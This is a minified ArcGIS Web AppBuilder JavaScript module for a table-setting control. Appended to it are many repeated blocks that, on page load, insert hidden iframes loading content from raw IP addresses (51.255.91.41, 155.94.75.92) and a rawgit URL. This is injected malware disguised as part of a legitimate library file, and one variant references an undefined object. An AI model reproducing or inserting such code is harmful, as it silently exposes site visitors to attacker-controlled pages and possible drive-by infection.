// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/array dojo/_base/declare dojo/on dojo/query ./settingComponents ./SettingObject".split(" "),function(d,n,e,p,g,q){return n(q,{_inputControl:null,_isFlagged:!0,constructor:function(a,b,f,c,d,m,h,k,l){a=[];c=[{name:"selected",title:"",width:"32px",type:"checkbox",editable:!1},{name:"item",title:c,width:"auto",type:"text",editable:!1},{name:"actions",title:"",width:"40px",type:"actions",actions:["up","down"]}];"function"===typeof k&&(this._isFlagged=!1,c=c.slice(1),c[1].width="60px",
c[1].actions.push("delete"));f=g.tableCtl(f,{autoHeight:!0,selectable:"function"===typeof h,fields:c},d);a.push(f.div);this._inputControl=f.ctl;h&&this.own(e(this._inputControl,"row-select",h));k&&this.own(e(this._inputControl,"row-delete",k));l&&(this.own(e(this._inputControl,"row-up",function(a){l(a,!0)})),this.own(e(this._inputControl,"row-down",function(a){l(a,!1)})));m&&a.push(g.text("hint",m));this._mainDiv=g.container(b||"","minorTrailingVertGap",a)},addRowToTable:function(a){this._inputControl&&
this._inputControl.addRow(a)},selectTableRow:function(a){(a=this._getRowTR(a))&&this._inputControl.selectRow(a)},renameTableRow:function(a,b){(a=this._getRowTR(a))&&this._inputControl.editRow(a,{item:b})},setValue:function(a){this._inputControl&&(this._inputControl.addRows(this._isFlagged?this._convertTableConfigToTableLines(a):a),this.selectTableRow(0))},getValue:function(){var a;return this._inputControl?(a=this._inputControl.getData(),this._isFlagged?this._convertTableLinesToTableConfig(a):a):
null},setConfig:function(){this._inputControl&&this._config&&this.setValue(this._config)},getConfig:function(){this._inputControl&&(this._config=this.getValue())},_getRowTR:function(a){var b;return this._inputControl&&0<=a?(b=p(".simple-table-row",this._inputControl.domNode),a<b.length?b[a]:null):null},_convertTableConfigToTableLines:function(a){var b=a[0];return d.map(a.slice(1),function(a,c){return{item:a,selected:"1"===b[c]}})},_convertTableLinesToTableConfig:function(a){var b="";a=d.map(a,function(a){b+=
a.selected?"1":"0";return a.item});return a=[b].concat(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});